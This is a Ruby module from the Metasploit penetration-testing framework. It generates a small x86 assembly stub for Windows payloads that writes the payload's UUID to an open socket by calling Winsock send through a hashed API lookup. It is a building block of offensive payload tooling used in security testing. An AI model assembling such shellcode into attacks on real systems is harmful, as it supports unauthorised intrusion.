# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid'

module Msf

###
#
# Basic send_uuid stub for Windows ARCH_X86 payloads
#
###

module Payload::Windows::SendUUID

  #
  # Generate assembly code that writes the UUID to the socket.
  #
  # This code assumes that the block API pointer is in ebp, and
  # the communications socket handle is in edi.
  #
  def asm_send_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm =%Q^
      send_uuid:
        push 0                 ; flags
        push #{uuid_raw.length} ; length of the UUID
        call get_uuid_address  ; put uuid buffer on tehe stack
        db #{raw_to_db(uuid_raw)}  ; UUID
      get_uuid_address:
        push edi               ; saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
        call ebp               ; call send
    ^

    asm
  end

end

end

